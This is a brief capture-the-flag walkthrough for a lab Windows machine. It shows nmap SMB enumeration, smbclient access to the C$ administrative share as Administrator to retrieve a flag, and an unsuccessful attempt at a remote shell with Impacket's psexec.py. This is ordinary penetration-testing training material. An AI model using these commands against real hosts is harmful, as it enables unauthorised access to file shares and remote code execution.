 # Tactics

 ## Enumeration

 ### nmap
 ```
PORT    STATE SERVICE       REASON  VERSION
135/tcp open  msrpc         syn-ack Microsoft Windows RPC
139/tcp open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds? syn-ack
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2021-12-16T17:44:39
|_  start_date: N/A
|_clock-skew: 13m08s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 54494/tcp): CLEAN (Timeout)
|   Check 2 (port 38363/tcp): CLEAN (Timeout)
|   Check 3 (port 60770/udp): CLEAN (Timeout)
|   Check 4 (port 31009/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

 ```
### smbclient

```
└──╼ $smbclient -L \\\\10.129.35.202 -U Administrator 
Enter WORKGROUP\Administrator's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

Now go grab the flag
```
└──╼ $smbclient \\\\10.129.35.202\\C$ -U Administrator 
Enter WORKGROUP\Administrator's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  $Recycle.Bin                      DHS        0  Wed Apr 21 16:23:49 2021
  Config.Msi                        DHS        0  Wed Jul  7 19:04:56 2021
  Documents and Settings          DHSrn        0  Wed Apr 21 16:17:12 2021
  pagefile.sys                      AHS 738197504  Thu Dec 16 18:42:20 2021
  PerfLogs                            D        0  Sat Sep 15 08:19:00 2018
  Program Files                      DR        0  Wed Jul  7 19:04:24 2021
  Program Files (x86)                 D        0  Wed Jul  7 19:03:38 2021
  ProgramData                        DH        0  Wed Apr 21 16:31:48 2021
  Recovery                         DHSn        0  Wed Apr 21 16:17:15 2021
  System Volume Information         DHS        0  Wed Apr 21 16:34:04 2021
  Users                              DR        0  Wed Apr 21 16:23:18 2021
  Windows                             D        0  Thu Dec 16 19:40:13 2021
c
                3774463 blocks of size 4096. 1159965 blocks available
smb: \> cd Users/Administrator/Desktop
smb: \Users\Administrator\Desktop\> dir
  .                                  DR        0  Thu Apr 22 08:16:03 2021
  ..                                 DR        0  Thu Apr 22 08:16:03 2021
  desktop.ini                       AHS      282  Wed Apr 21 16:23:32 2021
  flag.txt                            A       32  Fri Apr 23 10:39:00 2021

                3774463 blocks of size 4096. 1159965 blocks available
smb: \Users\Administrator\Desktop\> get flag.txt
getting file \Users\Administrator\Desktop\flag.txt of size 32 as flag.txt (0,0 KiloBytes/sec) (average 0,0 KiloBytes/sec)
```

Now if we wanted a shell to take access with `psexec.py`

```
└──╼ $psexec.py Administrator@10.129.35.202 
Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.129.35.202.....
[*] Found writable share ADMIN$
[*] Uploading file atGlmlTk.exe
...

```
But I could not make that work

Got `flag.txt` anyway!

